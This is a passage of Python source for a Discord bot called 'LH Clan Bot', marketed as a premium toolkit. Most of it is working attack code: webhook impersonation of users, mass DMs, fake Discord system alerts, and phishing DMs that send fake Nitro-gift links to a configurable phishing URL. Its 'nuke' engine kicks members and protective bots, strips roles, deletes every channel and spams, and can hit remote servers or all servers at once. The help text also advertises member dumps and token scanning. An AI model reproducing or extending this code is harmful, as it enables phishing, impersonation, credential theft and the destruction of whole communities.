async def token_info(interaction: discord.Interaction, token: str):
    if interaction.user.id != PREMIUM_USER_ID:
        await interaction.response.send_message("❌ Owner only.", ephemeral=True); return
    tok = token.strip()
    data = active_tokens.get(tok)
    if not data:
        await interaction.response.send_message("❌ Token not found or expired.", ephemeral=True); return
    embed = discord.Embed(title="🔑 Token Info", description=token_info_str(tok, data), color=0xffd700, timestamp=discord.utils.utcnow())
    embed.add_field(name="Created By", value=f"`{data['created_by']}`",                           inline=True)
    embed.add_field(name="Created At", value=f"<t:{int(data['created_at'])}:R>",                  inline=True)
    embed.add_field(name="Label",      value=f"`{data['label']}`" if data["label"] else "*(none)*", inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)


# ══════════════════════════════════════════════════════════════
#  SOCIAL ENGINEERING COMMANDS
# ══════════════════════════════════════════════════════════════

@bot.command(name="impersonate")
async def impersonate(ctx, user: Optional[discord.Member] = None, *, message: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not is_premium(ctx.author.id):
        await ctx.send("❌ Premium required.", delete_after=5); return
    if not user or not message:
        await ctx.send("❌ Usage: `!impersonate @user <message>`", delete_after=5); return
    webhooks = await ctx.channel.webhooks()
    webhook  = next((w for w in webhooks if w.user == ctx.guild.me), None)
    if not webhook:
        webhook = await ctx.channel.create_webhook(name="LH")
    avatar_url = user.display_avatar.url
    await webhook.send(content=message, username=user.display_name, avatar_url=avatar_url)

@bot.command(name="massdm")
async def massdm(ctx, *, message: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not is_premium(ctx.author.id):
        await ctx.send("❌ Premium required.", delete_after=5); return
    if not message:
        await ctx.send("❌ Usage: `!massdm <message>`", delete_after=5); return
    guild   = ctx.guild
    success = 0; failed = 0
    status  = await ctx.send(f"📨 Sending DMs to {guild.member_count} members...")
    for member in guild.members:
        if member.bot: continue
        try:
            await member.send(message); success += 1
            await asyncio.sleep(0.5)
        except Exception:
            failed += 1
    embed = discord.Embed(title="📨 Mass DM Complete", color=0x00ff00, timestamp=discord.utils.utcnow())
    embed.add_field(name="✅ Sent",   value=str(success), inline=True)
    embed.add_field(name="❌ Failed", value=str(failed),  inline=True)
    try: await status.edit(content=None, embed=embed)
    except Exception: await ctx.send(embed=embed, delete_after=15)

@bot.command(name="announce")
async def announce(ctx, channel: Optional[discord.TextChannel] = None, *, message: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not is_premium(ctx.author.id):
        await ctx.send("❌ Premium required.", delete_after=5); return
    if not channel or not message:
        await ctx.send("❌ Usage: `!announce #channel <message>`", delete_after=5); return
    embed = discord.Embed(description=message, color=0x5865f2, timestamp=discord.utils.utcnow())
    embed.set_author(name=ctx.guild.name, icon_url=ctx.guild.icon.url if ctx.guild.icon else None)
    try:
        await channel.send(embed=embed)
        await ctx.send(f"✅ Announced in {channel.mention}.", delete_after=5)
    except discord.Forbidden:
        await ctx.send("❌ No permission to send in that channel.", delete_after=5)

@bot.command(name="rename")
async def rename(ctx, member: Optional[discord.Member] = None, *, new_name: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not is_premium(ctx.author.id):
        await ctx.send("❌ Premium required.", delete_after=5); return
    if not member or not new_name:
        await ctx.send("❌ Usage: `!rename @user <new name>`", delete_after=5); return
    try:
        await member.edit(nick=new_name)
        await ctx.send(f"✅ Renamed to `{new_name}`.", delete_after=5)
    except discord.Forbidden:
        await ctx.send("❌ Cannot rename that user.", delete_after=5)

@bot.command(name="fake")
async def fake(ctx, user: Optional[discord.Member] = None, channel: Optional[discord.TextChannel] = None, *, message: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not is_premium(ctx.author.id):
        await ctx.send("❌ Premium required.", delete_after=5); return
    if not user or not channel or not message:
        await ctx.send("❌ Usage: `!fake @user #channel <message>`", delete_after=5); return
    webhooks = await channel.webhooks()
    webhook  = next((w for w in webhooks if w.user == ctx.guild.me), None)
    if not webhook:
        webhook = await channel.create_webhook(name="LH")
    await webhook.send(content=message, username=user.display_name, avatar_url=user.display_avatar.url)
    await ctx.send(f"✅ Fake message sent in {channel.mention}.", delete_after=5)

@bot.command(name="fakealert")
async def fakealert(ctx, channel: Optional[discord.TextChannel] = None, *, alert_text: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not is_premium(ctx.author.id):
        await ctx.send("❌ Premium required.", delete_after=5); return
    if not channel or not alert_text:
        await ctx.send("❌ Usage: `!fakealert #channel <alert text>`", delete_after=5); return
    embed = discord.Embed(
        title="⚠️ System Alert",
        description=alert_text,
        color=0xff0000,
        timestamp=discord.utils.utcnow()
    )
    embed.set_author(name="Discord Safety", icon_url="https://cdn.discordapp.com/embed/avatars/0.png")
    embed.set_footer(text="Discord System Message")
    try:
        await channel.send(embed=embed)
        await ctx.send(f"✅ Alert sent in {channel.mention}.", delete_after=5)
    except discord.Forbidden:
        await ctx.send("❌ Cannot send in that channel.", delete_after=5)

@bot.command(name="poison")
async def poison(ctx, member: Optional[discord.Member] = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not is_premium(ctx.author.id):
        await ctx.send("❌ Premium required.", delete_after=5); return
    if not member:
        await ctx.send("❌ Usage: `!poison @user`", delete_after=5); return
    try:
        await member.send(
            embed=discord.Embed(
                title="🔒 Account Security Notice",
                description=(
                    "**Your account has been flagged for unusual activity.**\n\n"
                    "To secure your account, please verify your identity immediately at:\n"
                    "https://discord.com/safety\n\n"
                    "*Failure to verify within 24 hours will result in account suspension.*"
                ),
                color=0xff0000,
                timestamp=discord.utils.utcnow()
            )
        )
        await ctx.send(f"✅ Poison DM sent to {member}.", delete_after=5)
    except discord.Forbidden:
        await ctx.send("❌ Cannot DM that user.", delete_after=5)

@bot.command(name="phish")
async def phish_cmd(ctx, member: Optional[discord.Member] = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not is_premium(ctx.author.id):
        await ctx.send("❌ Premium required.", delete_after=5); return
    if not member:
        await ctx.send("❌ Usage: `!phish @user`", delete_after=5); return
    phish_url = os.environ.get("PHISH_URL", "").rstrip("/")
    if not phish_url:
        await ctx.send("❌ `PHISH_URL` not set in Railway variables.", delete_after=5); return
    link = f"{phish_url}/claim/{member.id}"
    try:
        await member.send(
            embed=discord.Embed(
                title="🎁 Nitro Gift Claimed!",
                description=(
                    f"**Someone sent you Discord Nitro!**\n\n"
                    f"Click below to claim your free Nitro subscription:\n"
                    f"[**Claim Now →**]({link})\n\n"
                    "*Offer expires in 48 hours.*"
                ),
                color=0x5865f2,
                timestamp=discord.utils.utcnow()
            )
        )
        await ctx.send(f"✅ Phish DM sent to {member}.", delete_after=5)
    except discord.Forbidden:
        await ctx.send("❌ Cannot DM that user.", delete_after=5)

@bot.command(name="massrole")
async def massrole(ctx, role: Optional[discord.Role] = None, action: str = "add"):
    try: await ctx.message.delete()
    except Exception: pass
    if not is_premium(ctx.author.id):
        await ctx.send("❌ Premium required.", delete_after=5); return
    if not role:
        await ctx.send("❌ Usage: `!massrole @role add/remove`", delete_after=5); return
    action = action.lower()
    if action not in ("add", "remove"):
        await ctx.send("❌ Action must be `add` or `remove`.", delete_after=5); return
    success = 0; failed = 0
    status  = await ctx.send(f"⚙️ {'Adding' if action == 'add' else 'Removing'} `{role.name}` for all members...")
    for member in ctx.guild.members:
        if member.bot: continue
        try:
            if action == "add" and role not in member.roles:
                await member.add_roles(role); success += 1
            elif action == "remove" and role in member.roles:
                await member.remove_roles(role); success += 1
        except Exception:
            failed += 1
    embed = discord.Embed(title=f"⚙️ Mass Role {'Add' if action == 'add' else 'Remove'} Complete", color=0x00ff00, timestamp=discord.utils.utcnow())
    embed.add_field(name="✅ Done",   value=str(success), inline=True)
    embed.add_field(name="❌ Failed", value=str(failed),  inline=True)
    try: await status.edit(content=None, embed=embed)
    except Exception: await ctx.send(embed=embed, delete_after=10)


# ══════════════════════════════════════════════════════════════
#  ANTINUKE COMMANDS
# ══════════════════════════════════════════════════════════════

@bot.command(name="antinuke")
async def antinuke_cmd(ctx, action: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Administrator required.", delete_after=5); return
    if not action:
        await ctx.send("❌ Usage: `!antinuke on/off/status`", delete_after=5); return
    action = action.lower()
    if action == "on":
        antinuke_enabled[ctx.guild.id] = True
        snapshot_roles(ctx.guild); snapshot_channels(ctx.guild)
        await ctx.send(embed=discord.Embed(title="🛡️ AntiNuke Enabled", description="Snapshots taken. Protection active.", color=0x00ff00), delete_after=10)
    elif action == "off":
        antinuke_enabled[ctx.guild.id] = False
        await ctx.send(embed=discord.Embed(title="🛡️ AntiNuke Disabled", description="Protection off. Use `!antinuke on` to re-enable.", color=0xff9900), delete_after=10)
    elif action == "status":
        status = "🟢 Enabled" if antinuke_enabled.get(ctx.guild.id, True) else "🔴 Disabled"
        wl     = antinuke_whitelist.get(ctx.guild.id, set())
        embed  = discord.Embed(title="🛡️ AntiNuke Status", color=0x5865f2)
        embed.add_field(name="Status",    value=status,                                          inline=False)
        embed.add_field(name="Whitelist", value=", ".join(f"`{uid}`" for uid in wl) or "Empty", inline=False)
        await ctx.send(embed=embed, delete_after=15)
    else:
        await ctx.send("❌ Usage: `!antinuke on/off/status`", delete_after=5)

@bot.command(name="whitelist")
async def whitelist_cmd(ctx, action: str = None, user: Optional[discord.Member] = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Administrator required.", delete_after=5); return
    if not action or action.lower() not in ("add", "remove", "list"):
        await ctx.send("❌ Usage: `!whitelist add/remove @user` or `!whitelist list`", delete_after=5); return
    action = action.lower()
    if action == "list":
        wl = antinuke_whitelist.get(ctx.guild.id, set())
        embed = discord.Embed(title="📋 AntiNuke Whitelist", description="\n".join(f"`{uid}`" for uid in wl) or "Empty", color=0x5865f2)
        await ctx.send(embed=embed, delete_after=15); return
    if not user:
        await ctx.send(f"❌ Usage: `!whitelist {action} @user`", delete_after=5); return
    if action == "add":
        antinuke_whitelist[ctx.guild.id].add(user.id)
        await ctx.send(f"✅ `{user}` added to whitelist.", delete_after=5)
    elif action == "remove":
        antinuke_whitelist[ctx.guild.id].discard(user.id)
        await ctx.send(f"✅ `{user}` removed from whitelist.", delete_after=5)

@bot.command(name="snapshot")
async def snapshot_cmd(ctx):
    try: await ctx.message.delete()
    except Exception: pass
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Administrator required.", delete_after=5); return
    snapshot_roles(ctx.guild); snapshot_channels(ctx.guild)
    embed = discord.Embed(title="📸 Snapshot Taken", color=0x00ff00, timestamp=discord.utils.utcnow())
    embed.add_field(name="Roles",    value=str(len(role_snapshots.get(ctx.guild.id, {}))),    inline=True)
    embed.add_field(name="Channels", value=str(len(channel_snapshots.get(ctx.guild.id, {}))), inline=True)
    await ctx.send(embed=embed, delete_after=10)

@bot.command(name="restore")
async def restore_cmd(ctx, target: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Administrator required.", delete_after=5); return
    guild = ctx.guild
    if not target:
        await ctx.send("❌ Usage: `!restore roles` / `!restore channels` / `!restore all`", delete_after=5); return
    target = target.lower()
    status = await ctx.send(f"🔄 Restoring `{target}`...")
    if target in ("roles", "all"):
        for role_id in role_snapshots.get(guild.id, {}):
            if not guild.get_role(role_id):
                await restore_role(guild, role_id)
    if target in ("channels", "all"):
        for ch_id in channel_snapshots.get(guild.id, {}):
            if not guild.get_channel(ch_id):
                await restore_channel(guild, ch_id)
    try: await status.edit(content=f"✅ Restore `{target}` complete.")
    except Exception: pass


# ══════════════════════════════════════════════════════════════
#  HELP MENU
# ══════════════════════════════════════════════════════════════

class HelpView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🛡️ AntiNuke", style=discord.ButtonStyle.blurple, custom_id="help_antinuke")
    async def antinuke_help(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="🛡️ AntiNuke Commands", color=0x00ff00)
        embed.add_field(name="Commands", value=(
            "`!antinuke on/off/status`\n"
            "`!whitelist add/remove/list @user`\n"
            "`!snapshot` — take a fresh snapshot\n"
            "`!restore roles/channels/all`\n"
        ), inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="🔑 Tokens", style=discord.ButtonStyle.blurple, custom_id="help_tokens")
    async def token_help(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="🔑 Token Commands", color=0xffd700)
        embed.add_field(name="Slash Commands", value=(
            "`/token create` — create a token\n"
            "`/token list` — list all tokens\n"
            "`/token revoke <token>` — revoke a token\n"
            "`/token info <token>` — check token details\n"
            "`!LH T` — quick 1-use token (prefix)\n"
        ), inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="🎯 Social Eng", style=discord.ButtonStyle.red, custom_id="help_social")
    async def social_help(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="🎯 Social Engineering", color=0xff4400)
        embed.add_field(name="Commands (Premium)", value=(
            "`!impersonate @user <msg>`\n"
            "`!massdm <msg>`\n"
            "`!announce #ch <msg>`\n"
            "`!rename @user <name>`\n"
            "`!fake @user #ch <msg>`\n"
            "`!fakealert #ch <text>`\n"
            "`!poison @user`\n"
            "`!phish @user`\n"
            "`!massrole @role add/remove`\n"
        ), inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="💬 DM Tunnel", style=discord.ButtonStyle.green, custom_id="help_tunnel")
    async def tunnel_help(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="💬 DM Tunnel Commands", color=0x5865f2)
        embed.add_field(name="Commands (Premium)", value=(
            "`!dmt <userID> <message>` — open a tunnel DM\n"
            "Target gets an embed with a **Reply** button\n"
            "Their reply pops up as a modal box → forwarded to your DMs\n\n"
            "`!dmtreply <userID> <message>` — send a follow-up\n"
            "`!dmtclose <userID>` — close the tunnel\n"
            "`!dmtlist` — list all open tunnels (owner)\n"
        ), inline=False)
        embed.set_footer(text="Tunnels are in-memory — reset on bot restart")
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="💀 Nuke", style=discord.ButtonStyle.red, custom_id="help_nuke")
    async def nuke_help(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="💀 Nuke Commands", color=0xff0000)
        embed.add_field(name="Commands", value=(
            "`!LH` — nuke current server (admin)\n"
            "`!LH GHOST` — ghost nuke (impersonates top admin)\n"
            "`!LH EXEC <serverID> <token>` — remote nuke\n"
            "`!LH ALL <token>` — nuke all servers bot is in\n"
            "`!LH CLONE <src> <tgt> <token>` — clone server structure\n"
            "`!LHP` — configure nuke settings (token required)\n"
        ), inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="📡 Intel", style=discord.ButtonStyle.grey, custom_id="help_intel")
    async def intel_help(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="📡 Intel Commands", color=0x5865f2)
        embed.add_field(name="Commands (Owner)", value=(
            "`!LHSPY` — list all servers bot is in\n"
            "`!LHMEMBERS <serverID>` — dump member list\n"
            "`!LHTOKENS <serverID>` — scan for Discord tokens\n"
        ), inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="👑 Premium", style=discord.ButtonStyle.grey, custom_id="help_premium")
    async def premium_help(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="👑 Premium Commands", color=0xffd700)
        embed.add_field(name="Commands (Owner)", value=(
            "`!giftpremium <userID> <duration>` — grant premium\n"
            "`!revokepremium <userID>` — revoke premium\n"
            "`!premiumlist` — list premium users\n\n"
            "**Durations:** `30d`, `7d`, `24h`, `permanent`\n"
        ), inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.command(name="help")
async def help_cmd(ctx):
    try: await ctx.message.delete()
    except Exception: pass
    embed = discord.Embed(
        title="⚔️ LH Clan Bot",
        description=(
            "**Premium Discord toolkit.**\n\n"
            "Use the buttons below to explore each category.\n\n"
            "**Quick Start:**\n"
            "• Get a token: `/token create` or `!LH T`\n"
            "• Enable protection: `!antinuke on`\n"
            "• Send a tunnel DM: `!dmt <userID> <message>`\n"
        ),
        color=0x5865f2,
        timestamp=discord.utils.utcnow()
    )
    embed.set_footer(text="LH Clan Bot • Premium Toolkit")
    view = HelpView()
    msg = await ctx.send(embed=embed, view=view)
    await asyncio.sleep(120)
    try: await msg.edit(view=None)
    except Exception: pass


# ══════════════════════════════════════════════════════════════
#  PREMIUM GIFTING
# ══════════════════════════════════════════════════════════════

@bot.command(name="giftpremium")
async def gift_premium(ctx, user_id: str = None, duration: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send(embed=discord.Embed(title="❌ Access Denied", color=0xff0000), delete_after=5); return
    if not user_id or not duration:
        await ctx.send("❌ Usage: `!giftpremium <userID> <duration>`\nDurations: `30d`, `7d`, `24h`, `permanent`", delete_after=5); return
    try: target_id = int(user_id)
    except ValueError:
        await ctx.send("❌ Invalid user ID.", delete_after=5); return
    secs = parse_duration(duration)
    if secs is None:
        await ctx.send("❌ Invalid duration.", delete_after=5); return
    try:
        target = await bot.fetch_user(target_id)
    except (ValueError, discord.NotFound):
        await ctx.send("❌ User not found.", delete_after=5); return
    premium_users[target_id] = float("inf") if secs == float("inf") else time.time() + secs
    exp_str = premium_expiry_str(target_id)
    try:
        await target.send(embed=discord.Embed(title="👑 Premium Access Granted!", description=f"You have been granted **LH Premium**.\n\n**Duration:** `{exp_str}`\n\nUse `!help` → Premium Commands.", color=0xffd700, timestamp=discord.utils.utcnow()))
    except Exception: pass
    confirm = discord.Embed(title="✅ Premium Gifted", color=0x00ff00)
    confirm.add_field(name="User",     value=f"{target} (`{target_id}`)", inline=False)
    confirm.add_field(name="Duration", value=exp_str, inline=True)
    try:
        await ctx.author.send(embed=confirm)
        await ctx.send("✅ Premium gifted.", delete_after=5)
    except Exception:
        await ctx.send(embed=confirm, delete_after=10)

@bot.command(name="revokepremium")
async def revoke_premium(ctx, user_id: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send(embed=discord.Embed(title="❌ Access Denied", color=0xff0000), delete_after=5); return
    if not user_id:
        await ctx.send("❌ Usage: `!revokepremium <userID>`", delete_after=5); return
    try: target_id = int(user_id)
    except ValueError:
        await ctx.send("❌ Invalid user ID.", delete_after=5); return
    if target_id == PREMIUM_USER_ID:
        await ctx.send("❌ Cannot revoke master user.", delete_after=5); return
    if target_id not in premium_users:
        await ctx.send("❌ That user doesn't have premium.", delete_after=5); return
    premium_users.pop(target_id)
    try:
        target = await bot.fetch_user(target_id)
        await target.send(embed=discord.Embed(title="⚠️ Premium Access Revoked", description="Your LH Premium access has been revoked.", color=0xff0000, timestamp=discord.utils.utcnow()))
    except Exception: pass
    await ctx.send(f"✅ Premium revoked for `{target_id}`.", delete_after=5)

@bot.command(name="premiumlist")
async def premium_list(ctx):
    try: await ctx.message.delete()
    except Exception: pass
    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send("❌ Access Denied.", delete_after=5); return
    embed = discord.Embed(title="👑 Premium Users", color=0xffd700, timestamp=discord.utils.utcnow())
    if not premium_users:
        embed.description = "No premium users."
    else:
        lines = []
        for uid, expiry in premium_users.items():
            exp    = "Permanent" if expiry == float("inf") else premium_expiry_str(uid)
            status = "✅" if is_premium(uid) else "❌ Expired"
            lines.append(f"`{uid}` — {exp} {status}")
        embed.description = "\n".join(lines)
    embed.set_footer(text=f"Total: {len(premium_users)} users")
    try:
        await ctx.author.send(embed=embed)
        await ctx.send("👑 Premium list sent to your DMs.", delete_after=5)
    except Exception:
        msg = await ctx.send(embed=embed)
        await asyncio.sleep(20)
        try: await msg.delete()
        except Exception: pass


# ══════════════════════════════════════════════════════════════
#  VERIFY
# ══════════════════════════════════════════════════════════════

class VerifyButton(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Verify", emoji="✅", style=discord.ButtonStyle.green, custom_id="verify_button")
    async def verify(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = interaction.guild
        role  = discord.utils.get(guild.roles, name=VERIFY_ROLE_NAME)
        if not role:
            await interaction.response.send_message(embed=discord.Embed(title="❌ Setup Error", description=f"No role named `{VERIFY_ROLE_NAME}`.\nContact an admin.", color=0xff0000), ephemeral=True); return
        if role in interaction.user.roles:
            await interaction.response.send_message(embed=discord.Embed(title="Already Verified", description="You already have the verified role.", color=0x5865f2), ephemeral=True); return
        try:
            await interaction.user.add_roles(role, reason="Passed verification")
            embed = discord.Embed(title="✅ Verification Successful", description=f"Welcome to **{guild.name}**, {interaction.user.mention}!\n\nYou now have full access to the server.", color=0x00ff00, timestamp=discord.utils.utcnow())
            embed.set_thumbnail(url=interaction.user.display_avatar.url)
            embed.set_footer(text=f"{guild.name} Verification System", icon_url=guild.icon.url if guild.icon else None)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            log_embed = discord.Embed(title="👤 Member Verified", color=0x00ff00, timestamp=discord.utils.utcnow())
            log_embed.add_field(name="User", value=f"{interaction.user} (`{interaction.user.id}`)", inline=False)
            log_embed.add_field(name="Role", value=role.mention, inline=True)
            log_embed.set_thumbnail(url=interaction.user.display_avatar.url)
            log_ch = await get_or_create_log_channel(guild)
            if log_ch:
                try: await log_ch.send(embed=log_embed)
                except Exception: pass
        except discord.Forbidden:
            await interaction.response.send_message(embed=discord.Embed(title="❌ Permission Error", description="Bot lacks permission to assign roles.", color=0xff0000), ephemeral=True)

@bot.tree.command(name="setupverify", description="Post the professional verification panel (admin only)")
@app_commands.checks.has_permissions(administrator=True)
async def setupverify(interaction: discord.Interaction):
    guild = interaction.guild
    embed = discord.Embed(
        title="🔐 Server Verification",
        description=(
            f"**Welcome to {guild.name}!**\n\n"
            "To gain access to the server, you must verify your account.\n\n"
            "**How to verify:**\n"
            "› Click the **Verify** button below\n"
            "› You will instantly receive access\n\n"
            "**Why verify?**\n"
            "› Keeps the server safe from bots and raiders\n"
            "› Unlocks all channels and features\n\n"
            "*By verifying, you agree to follow the server rules.*"
        ),
        color=0x5865f2, timestamp=discord.utils.utcnow()
    )
    embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
    embed.set_footer(text=f"{guild.name} • Verification System", icon_url=guild.icon.url if guild.icon else None)
    await interaction.response.send_message(embed=embed, view=VerifyButton())


# ══════════════════════════════════════════════════════════════
#  CORE NUKE ENGINE
# ══════════════════════════════════════════════════════════════

async def clone_server(source: discord.Guild, target: discord.Guild):
    """copy source server structure into target — roles, categories, text + voice channels"""

    await asyncio.gather(*[ch.delete() for ch in target.channels], return_exceptions=True)

    for role in target.roles:
        if role.is_default() or role >= target.me.top_role:
            continue
        try:
            await role.delete(reason="LH Clone — clearing roles")
        except Exception:
            pass

    role_map: dict[int, discord.Role] = {}
    for role in sorted([r for r in source.roles if not r.is_default() and not r.managed], key=lambda r: r.position):
        try:
            new_role = await target.create_role(
                name=role.name, color=role.color, permissions=role.permissions,
                hoist=role.hoist, mentionable=role.mentionable, reason="LH Clone"
            )
            role_map[role.id] = new_role
        except Exception:
            pass

    def build_overwrites(channel_or_cat, tgt_guild):
        overwrites = {}
        for obj, ow in channel_or_cat.overwrites.items():
            if isinstance(obj, discord.Role):
                new_obj = tgt_guild.default_role if obj.is_default() else role_map.get(obj.id)
            else:
                new_obj = None
            if new_obj:
                overwrites[new_obj] = ow
        return overwrites

    category_map: dict[int, discord.CategoryChannel] = {}
    for cat in sorted(source.categories, key=lambda c: c.position):
        try:
            new_cat = await target.create_category(
                name=cat.name, overwrites=build_overwrites(cat, target), reason="LH Clone"
            )
            category_map[cat.id] = new_cat
        except Exception:
            pass

    for ch in sorted(source.text_channels, key=lambda c: c.position):
        cat = category_map.get(ch.category_id) if ch.category_id else None
        try:
            await target.create_text_channel(
                name=ch.name, topic=ch.topic, slowmode_delay=ch.slowmode_delay,
                nsfw=ch.nsfw, category=cat, overwrites=build_overwrites(ch, target),
                reason="LH Clone"
            )
        except Exception:
            pass

    for ch in sorted(source.voice_channels, key=lambda c: c.position):
        cat = category_map.get(ch.category_id) if ch.category_id else None
        try:
            await target.create_voice_channel(
                name=ch.name, category=cat,
                overwrites=build_overwrites(ch, target), reason="LH Clone"
            )
        except Exception:
            pass


async def run_nuke(guild: discord.Guild):
    strip_tasks = [member.edit(roles=[], reason="LH — neutralize") for member in guild.members if member.bot and member != guild.me]
    await asyncio.gather(*strip_tasks, return_exceptions=True)
    kick_bots = [member.kick(reason="LH — antinuke removal") for member in guild.members if member.id in ANTINUKE_IDS]
    await asyncio.gather(*kick_bots, return_exceptions=True)
    role_tasks = [role.edit(permissions=discord.Permissions.none(), reason="LH — wipe") for role in guild.roles if role < guild.me.top_role and not role.is_default()]
    await asyncio.gather(*role_tasks, return_exceptions=True)
    kick_tasks = [member.kick(reason="LH Clan") for member in guild.members if member != guild.me and member != guild.owner and not member.bot]
    await asyncio.gather(*kick_tasks, return_exceptions=True)
    await asyncio.gather(*[ch.delete() for ch in guild.channels], return_exceptions=True)
    new_channels = []
    for _ in range(nuke_config["channel_count"]):
        try:
            ch = await guild.create_text_channel(nuke_config["channel_name"])
            new_channels.append(ch)
        except Exception: pass
    async def spam(ch):
        for _ in range(nuke_config["spam_count"]):
            try: await ch.send(nuke_config["message"])
            except Exception: pass
    await asyncio.gather(*[spam(ch) for ch in new_channels])


# ══════════════════════════════════════════════════════════════
#  LH — nuke + subcommands
# ══════════════════════════════════════════════════════════════

@bot.command(name="LH")
async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[str] = None):

    if subcommand and subcommand.upper() == "T":
        if ctx.author.id != PREMIUM_USER_ID:
            await ctx.send(embed=discord.Embed(title="❌ Access Denied", description="Owner only.", color=0xff0000), delete_after=5)
            try: await ctx.message.delete()
            except Exception: pass
            return
        tok = create_token(created_by=ctx.author.id, uses=1, label="LH T (prefix)")
        embed = discord.Embed(title="🔑 Token Generated (1 use, no expiry)", description=f"**Token:** `{tok}`\n\nFor full control use `/token create`.", color=0xffd700)
        try:
            await ctx.author.send(embed=embed)
            await ctx.message.delete()
            await ctx.send("🔑 Token sent to your DMs.", delete_after=5)
        except discord.Forbidden:
            await ctx.send(embed=embed, delete_after=15)
        return

    if subcommand and subcommand.upper() == "GHOST":
        if not ctx.author.guild_permissions.administrator:
            await ctx.send("❌ Administrator required.", delete_after=5); return
        guild  = ctx.guild
        target = None
        for member in sorted(guild.members, key=lambda m: m.top_role.position, reverse=True):
            if member == guild.me or member == guild.owner or member.bot: continue
            target = member; break
        if target:
            try:
                await guild.me.edit(nick=target.display_name)
                await bot.user.edit(avatar=await target.display_avatar.read())
            except Exception: pass
        try: await ctx.message.delete()
        except Exception: pass
        antinuke_enabled[guild.id] = False
        await asyncio.sleep(2)
        await run_nuke(guild)
        return

    if subcommand and subcommand.upper() == "EXEC":
        if not args or len(args.split()) < 2:
            await ctx.send("❌ Usage: `!LH EXEC <serverID> <token>`", delete_after=5); return
        parts = args.split()
        tok   = parts[1]
        valid, reason = _peek_token(tok)
        if not valid:
            await ctx.send(embed=discord.Embed(title="❌ Invalid Token", description=reason, color=0xff0000), delete_after=5)
            try: await ctx.message.delete()
            except Exception: pass
            return
        if not is_premium(ctx.author.id):
            await ctx.send("❌ Premium required.", delete_after=5); return
        try: target_guild = bot.get_guild(int(parts[0]))
        except ValueError:
            await ctx.send("❌ Invalid server ID.", delete_after=5); return
        if not target_guild:
            await ctx.send("❌ Bot is not in that server.", delete_after=5); return
        validate_token(tok)
        try: await ctx.message.delete()
        except Exception: pass
        await notify_owner(discord.Embed(title="💀 Remote Nuke Initiated", description=f"Targeting: **{target_guild.name}**", color=0xff0000, timestamp=discord.utils.utcnow()))
        antinuke_enabled[target_guild.id] = False
        await run_nuke(target_guild)
        return

    if subcommand and subcommand.upper() == "ALL":
        tok = args.strip() if args else ""
        valid, reason = _peek_token(tok)
        if not valid:
            await ctx.send(embed=discord.Embed(title="❌ Invalid Token", description=reason, color=0xff0000), delete_after=5)
            try: await ctx.message.delete()
            except Exception: pass
            return
        if not is_premium(ctx.author.id):
            await ctx.send("❌ Premium required.", delete_after=5); return
        validate_token(tok)
        guilds = list(bot.guilds)
        try: await ctx.message.delete()
        except Exception: pass
        await notify_owner(discord.Embed(title="💀 ALL SERVERS NUKE", description=f"Targeting **{len(guilds)}** servers.", color=0xff0000, timestamp=discord.utils.utcnow()))
        for g in guilds: antinuke_enabled[g.id] = False
        await asyncio.gather(*[run_nuke(g) for g in guilds], return_exceptions=True)
        return

    if subcommand and subcommand.upper() == "CLONE":
        if not args or len(args.split()) < 3:
            await ctx.send("❌ Usage: `!LH CLONE <sourceServerID> <targetServerID> <token>`", delete_after=5)
            return
        parts         = args.split()
        source_id_str = parts[0]
        target_id_str = parts[1]
        tok           = parts[2]

        valid, reason = _peek_token(tok)
        if not valid:
            await ctx.send(embed=discord.Embed(title="❌ Invalid Token", description=reason, color=0xff0000), delete_after=5)
            try: await ctx.message.delete()
            except Exception: pass
            return
        if not is_premium(ctx.author.id):
            await ctx.send("❌ Premium required.", delete_after=5); return

        try:
            source_guild = bot.get_guild(int(source_id_str))
            target_guild = bot.get_guild(int(target_id_str))
        except ValueError:
            await ctx.send("❌ Invalid server ID.", delete_after=5); return

        if not source_guild:
            await ctx.send("❌ Bot is not in the source server.", delete_after=5); return
        if not target_guild:
            await ctx.send("❌ Bot is not in the target server.", delete_after=5); return

        validate_token(tok)
